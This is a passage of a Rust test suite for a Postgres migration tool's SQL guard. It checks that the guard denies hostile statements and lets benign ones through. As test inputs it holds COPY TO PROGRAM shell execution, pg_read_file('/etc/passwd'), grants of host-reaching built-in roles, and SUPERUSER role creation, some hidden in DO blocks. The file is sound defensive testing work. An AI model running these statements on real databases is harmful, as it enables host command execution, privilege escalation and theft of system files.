        IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'evil') THEN
            CREATE ROLE "evil" SUPERUSER;
        END IF;
    END $$"#;

    match g.check(sql) {
        Err(GuardError::Denied { rule: r, .. }) => assert!(
            r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
            "DO-wrapped SUPERUSER must deny via superuser/body rule, got rule={r}"
        ),
        other => panic!("DO-wrapped SUPERUSER must be DENIED under Platform; got {other:?}"),
    }
}

#[test]
fn vendor_if_not_exists_superuser_role_op_is_refused_under_platform() {
    let guard_cfg = platform_guard_config();
    let author = platform_author(&guard_cfg);
    let op = zero_migrate_ir::ir::Op::CreateRole {
        name: "evil".into(),
        login: Some(true),
        password: None,
        bypass_rls: None,
        create_role: None,
        create_db: None,
        superuser: Some(true),
        in_role: None,
        set_search_path: None,
        if_not_exists: Some(true),
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &guard_cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(_) => {}
        Ok((_steps, fragments)) => panic!(
            "vendor createRole(superuser + ifNotExists) must be refused; got fragments={fragments:?}"
        ),
    }
}

#[test]
fn superuser_role_in_platform_do_body_token_scan_is_denied() {
    let g = platform_guard();
    let sql = r"DO $$ BEGIN
        EXECUTE format('ALTER ROLE %I SUPERUSER', 'zero_migrate_auth');
    END $$";

    match g.check(sql) {
        Err(GuardError::Denied { rule: r, .. }) => assert!(
            r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
            "DO body SUPERUSER token must deny via superuser/body rule, got rule={r}"
        ),
        other => panic!("DO body SUPERUSER token must be DENIED under Platform; got {other:?}"),
    }
}

// ---- Host-reaching built-in role membership grants are RCE-equivalent and
// remain denied under Platform. A prior bug: the GrantStmt/GrantRoleStmt arm
// returned Ok(()) immediately for Platform, so `GRANT pg_execute_server_program
// TO …` passed.

#[test]
fn host_escape_role_grant_denied_even_under_platform() {
    let g = platform_guard();
    assert!(
        g.check(r"GRANT SELECT ON TABLE zero_migrate.app_secrets TO zero_migrate_app")
            .is_ok(),
        "benign table GRANT must still pass under Platform"
    );

    for sql in [
        r"GRANT pg_execute_server_program TO zero_migrate_app",
        r#"GRANT "pg_read_server_files" TO zero_migrate_app"#,
        r"GRANT zero_migrate_app TO pg_write_server_files",
    ] {
        assert!(
            is_denied(&g, sql),
            "host-reaching built-in role membership grant must be DENIED even under Platform: {sql}"
        );
    }
}

// ---- raw vendor bodies still hit gate 2 ----

#[test]
fn vendor_create_function_body_rce_is_denied_under_platform_guard() {
    let guard_cfg = platform_guard_config();
    let author = platform_author(&guard_cfg);
    let op = zero_migrate_ir::ir::Op::CreateFunction {
        name: "audit_events_rce".into(),
        schema: Some("zero_migrate".into()),
        args: None,
        returns: "void".into(),
        language: zero_migrate_ir::ir::FuncLanguage::Plpgsql,
        replace: Some(true),
        volatility: None,
        body: "BEGIN COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'; END;".into(),
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &guard_cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "createFunction");
            assert!(
                matches!(
                    denial.source,
                    GuardError::Denied {
                        rule: rule::BODY_INSPECTION,
                        ..
                    }
                ),
                "the PL/pgSQL body must be scanned, got: {:?}",
                denial.source
            );
        }
        other => panic!(
            "vendor createFunction with COPY PROGRAM in its body must be denied; got {other:?}"
        ),
    }
}

#[test]
fn vendor_create_function_benign_body_is_allowed_under_platform_guard() {
    let guard_cfg = platform_guard_config();
    let author = platform_author(&guard_cfg);
    let op = zero_migrate_ir::ir::Op::CreateFunction {
        name: "audit_events_note".into(),
        schema: Some("zero_migrate".into()),
        args: None,
        returns: "void".into(),
        language: zero_migrate_ir::ir::FuncLanguage::Plpgsql,
        replace: Some(true),
        volatility: None,
        body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
    };

    let (_steps, fragments) = author
        .lower_guarded(
            &vendor_ir(op),
            &guard_cfg,
            &crate::render::lower::LiveSchema::default(),
        )
        .expect("benign vendor createFunction body must pass the Platform guard");
    assert_eq!(fragments.len(), 1);
    assert_eq!(fragments[0].op_kind, "createFunction");
    assert!(
        fragments[0].sql.contains("RAISE NOTICE 'ok'"),
        "the guarded fragment should be the rendered function statement: {:?}",
        fragments[0]
    );
}

#[test]
fn vendor_pg_raw_rce_is_denied_under_platform_guard() {
    let guard_cfg = platform_guard_config();
    let author = platform_author(&guard_cfg);
    let op = zero_migrate_ir::ir::Op::PgRaw {
        sql: "COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'".into(),
        reason: "raw COPY PROGRAM denial regression".into(),
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &guard_cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "pgRaw");
            assert!(
                matches!(
                    denial.source,
                    GuardError::Denied {
                        rule: rule::COPY_PROGRAM,
                        ..
                    }
                ),
                "pgRaw COPY PROGRAM should be caught by the AST deny-list, got: {:?}",
                denial.source
            );
        }
        other => panic!("vendor pgRaw COPY PROGRAM must be denied; got {other:?}"),
    }
}

#[test]
fn vendor_role_op_is_refused_at_lower_without_platform_capability() {
    let guard_cfg = confined_guard_config();
    let author = crate::render::lower::IrAuthor::new(
        "zero_migrate",
        "app_corpus",
        SqlDialect::Postgres,
        &crate::test_fixtures::no_inject("app"),
    );
    let op = zero_migrate_ir::ir::Op::CreateRole {
        name: "zero_migrate_auth".into(),
        login: Some(true),
        password: None,
        bypass_rls: None,
        create_role: None,
        create_db: None,
        superuser: None,
        in_role: None,
        set_search_path: None,
        if_not_exists: None,
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &guard_cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Lower(
            crate::render::lower::IrLowerError::VendorCapabilityDenied { op, capability },
        )) => {
            assert_eq!(op, "createRole");
            assert_eq!(
                capability,
                zero_migrate_ir::capability::VendorCapability::Role
            );
        }
        other => panic!(
            "vendor createRole must be refused at lower without Platform capability; got {other:?}"
        ),
    }
}

#[test]
fn benign_vendor_policy_is_refused_at_lower_without_capability() {
    let guard_cfg = confined_guard_config();
    let author = crate::render::lower::IrAuthor::new(
        "zero_migrate",
        "app_corpus",
        SqlDialect::Postgres,
        &crate::test_fixtures::no_inject("app"),
    );
    let op = zero_migrate_ir::ir::Op::CreatePolicy {
        name: "tenant_isolation".into(),
        table: "app_secrets".into(),
        schema: None,
        for_cmd: zero_migrate_ir::ir::PolicyCmd::All,
        to: None,
        using: zero_migrate_ir::expr::Expr::Literal {
            value: zero_migrate_ir::ir::IrScalar::Bool(true),
        },
        with_check: None,
    };

    assert!(
        matches!(
            author.lower_guarded(
                &vendor_ir(op),
                &guard_cfg,
                &crate::render::lower::LiveSchema::default(),
            ),
            Err(crate::render::lower::IrGuardedLowerError::Lower(_))
        ),
        "lower_guarded must re-enforce the vendor capability gate before rendering; \
         the SQL guard alone would allow a benign same-schema CREATE POLICY"
    );
}

// ---- SchemaScope Single is byte-identical at the read sites ---------

#[test]
fn t2_func_def_target_single_is_byte_identical() {
    let g = confined_guard(); // Single("zero_migrate")
                              // own-schema funcname → OK; foreign funcname → CrossSchema.
    assert!(g
        .check("CREATE FUNCTION zero_migrate.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
        .is_ok());
    assert!(matches!(
        g.check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$"),
        Err(GuardError::CrossSchema { .. })
    ));
    assert!(matches!(
        g.check("ALTER FUNCTION control.f() IMMUTABLE"),
        Err(GuardError::CrossSchema { .. })
    ));
}

#[test]
fn t2_literal_schema_refs_single_is_byte_identical() {
    let g = confined_guard(); // Single("zero_migrate")
    assert!(matches!(
        g.check("SELECT 'control.t'::regclass"),
        Err(GuardError::CrossSchema { .. })
    ));
    assert!(matches!(
        g.check("SELECT nextval('control.s')"),
        Err(GuardError::CrossSchema { .. })
    ));
    // own-schema literal ref → OK.
    assert!(g.check("SELECT nextval('zero_migrate.s')").is_ok());
}

#[test]
fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
    let g = platform_guard(); // Allowlist(zero_migrate, public)
                              // allowlisted schema → OK
    assert!(g
        .check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
        .is_ok());
    assert!(g.check("SELECT nextval('public.s')").is_ok());
    // non-allowlisted (creator) schema → still CrossSchema
    assert!(matches!(
        g.check("SELECT 'proj_acme.t'::regclass"),
        Err(GuardError::CrossSchema { .. })
    ));
}

#[test]
fn schema_scope_permits_is_case_insensitive() {
    assert!(SchemaScope::Single("Zero_migrate".into()).permits("zero_migrate"));
    assert!(SchemaScope::Allowlist(vec!["PubLic".into()]).permits("public"));
    assert!(!SchemaScope::Single("zero_migrate".into()).permits("control"));
}

// ---- The Trusted profile: the public dbmate-like posture ---------------

/// A Trusted guard, minted via the same `for_test` operator-token seam.
fn trusted_guard() -> SqlGuard {
    SqlGuard::new(trusted_guard_config())
}

fn trusted_guard_config() -> GuardConfig {
    GuardConfig::from_policy_with_mode(
        crate::test_fixtures::operator_with_data_security(&[], &[], false, DestructiveOps::Allow),
        SqlDialect::Postgres,
        GuardMode::Off,
    )
}

fn trusted_author() -> crate::render::lower::IrAuthor {
    let cfg = trusted_guard_config();
    let scope = cfg
        .schema_scope()
        .expect("Trusted guard carries the explicit unconfined operator scope");
    crate::render::lower::IrAuthor::new(
        "public",
        "app_corpus",
        SqlDialect::Postgres,
        &crate::test_fixtures::no_inject("public"),
    )
    .with_schema_scope(scope)
}

/// The Trusted early-return SKIPS the deny-list ENTIRELY: SQL the Confined
/// guard hard-denies (role mgmt, cross-schema, even RCE/host-escape shapes)
/// passes the GUARD under Trusted (the operator owns the DB — there is no
/// untrusted boundary; PG itself remains the only authority). This is the
/// guard-level proof; `db.rs`/`shadow.rs`/`executor.rs` ride on it.
#[test]
fn trusted_skips_the_denylist_that_confined_enforces() {
    let trusted = trusted_guard();
    let confined = confined_guard();
    // Each of these is a HARD Confined denial (role mgmt / cross-schema / RCE
    // tokens / host escape). Under Trusted the guard must not deny any.
    let arbitrary = [
        "CREATE ROLE zsmig_arbitrary NOLOGIN",
        "GRANT ALL ON SCHEMA public TO postgres",
        "CREATE TABLE other_schema.t (id int)",
        "ALTER SYSTEM SET wal_level = minimal",
        "COPY t TO PROGRAM 'sh -c id'",
        "SELECT pg_read_file('/etc/passwd')",
        "CREATE EXTENSION dblink",
    ];
    for sql in arbitrary {
        assert!(
            confined.check(sql).is_err(),
            "precondition: Confined must DENY {sql} for this test to be meaningful"
        );
        assert!(
            trusted.check(sql).is_ok(),
            "Trusted must SKIP the deny-list and PASS {sql}\n  got: {:?}",
            trusted.check(sql)
        );
    }
}

/// Trusted still DERIVES the destructive flag (classify is trust-independent):
/// a `DROP TABLE` passes the guard (no deny) but the report is `destructive`
/// and `flags_for` sets `requires_approval` — so the CLI's `--yes` gate holds.
#[test]
fn trusted_still_derives_destructive_flag_at_guard_level() {
    let g = trusted_guard();
    let report = g
        .check("DROP TABLE users")
        .expect("Trusted must not deny a DROP TABLE");
    assert!(
        report.destructive,
        "DROP TABLE is destructive under Trusted"
    );
    let flags = flags_for(&report);
    assert!(flags.destructive);
    assert!(
        flags.requires_approval,
        "a destructive op still requires approval (CLI --yes) under Trusted"
    );
}

#[test]
fn trusted_pg_raw_still_runs_raw_island_denylist_backstop() {
    let cfg = trusted_guard_config();
    let author = trusted_author();
    let bad = zero_migrate_ir::ir::Op::PgRaw {
        sql: "CREATE ROLE zsmig_raw_evil SUPERUSER".into(),
        reason: "raw SUPERUSER denial regression".into(),
    };

    match author.lower_guarded(
        &vendor_ir(bad),
        &cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "pgRaw");
            assert!(
                matches!(
                    denial.source,
                    GuardError::Denied {
                        rule: rule::SUPERUSER_ROLE,
                        ..
                    }
                ),
                "Trusted pgRaw must still hit the SUPERUSER deny-list backstop, got {:?}",
                denial.source
            );
        }
        other => panic!("Trusted pgRaw SUPERUSER must be denied; got {other:?}"),
    }

    let clean = zero_migrate_ir::ir::Op::PgRaw {
        sql: "SELECT 1".into(),
        reason: "trusted raw smoke test".into(),
    };
    author
        .lower_guarded(
            &vendor_ir(clean),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        )
        .expect("clean Trusted pgRaw should pass the raw-island backstop");
}

#[test]
fn trusted_create_function_body_still_runs_raw_island_denylist_backstop() {
    let cfg = trusted_guard_config();
    let author = trusted_author();
    let bad = zero_migrate_ir::ir::Op::CreateFunction {
        name: "raw_body_evil".into(),
        schema: Some("public".into()),
        args: None,
        returns: "void".into(),
        language: zero_migrate_ir::ir::FuncLanguage::Plpgsql,
        replace: Some(true),
        volatility: None,
        body: "BEGIN COPY public.audit_events TO PROGRAM 'sh -c id'; END;".into(),
    };

    match author.lower_guarded(
        &vendor_ir(bad),
        &cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "createFunction");
            assert!(
                matches!(
                    denial.source,
                    GuardError::Denied {
                        rule: rule::BODY_INSPECTION,
                        ..
                    }
                ),
                "Trusted createFunction body must be scanned, got {:?}",
                denial.source
            );
        }
        other => panic!("Trusted createFunction COPY PROGRAM body must deny; got {other:?}"),
    }

    let clean = zero_migrate_ir::ir::Op::CreateFunction {
        name: "raw_body_clean".into(),
        schema: Some("public".into()),
        args: None,
        returns: "void".into(),
        language: zero_migrate_ir::ir::FuncLanguage::Plpgsql,
        replace: Some(true),
        volatility: None,
        body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
    };
    author
        .lower_guarded(
            &vendor_ir(clean),
            &cfg,
            &crate::render::lower::LiveSchema::default(),
        )
        .expect("clean Trusted createFunction body should pass the raw-island backstop");
}

/// The Trusted early-return is gated on `trust == Trusted` ONLY: a Confined
/// guard still DENIES, and a Platform guard still APPLIES its (bounded)
/// widening — neither leaks the deny-list-off behaviour. This pins that the
/// Confined/Platform code paths are unchanged by the new branch.
#[test]
fn trusted_early_return_is_gated_on_trust_trusted_only() {
    // Confined: a privileged op is STILL denied (the early-return never fires).
    let confined = confined_guard();
    assert!(
        is_denied(&confined, "CREATE ROLE zsmig_x NOLOGIN"),
        "Confined must still deny CREATE ROLE — the Trusted branch must not fire"
    );
    // Platform: a privileged-but-bounded op still APPLIES, and a NON-allowlisted
    // cross-schema op still DENIES (Platform's deny-list is intact, NOT skipped).
    let platform = platform_guard();
    assert!(
        platform
            .check("CREATE ROLE zero_migrate_auth NOLOGIN")
            .is_ok(),
        "Platform widening intact"
    );
    assert!(
        is_denied(&platform, "CREATE TABLE proj_acme.steal(id int)"),
        "Platform must still deny a NON-allowlisted cross-schema op — \
         the Trusted deny-list-off branch must NOT fire under Platform"
    );
}
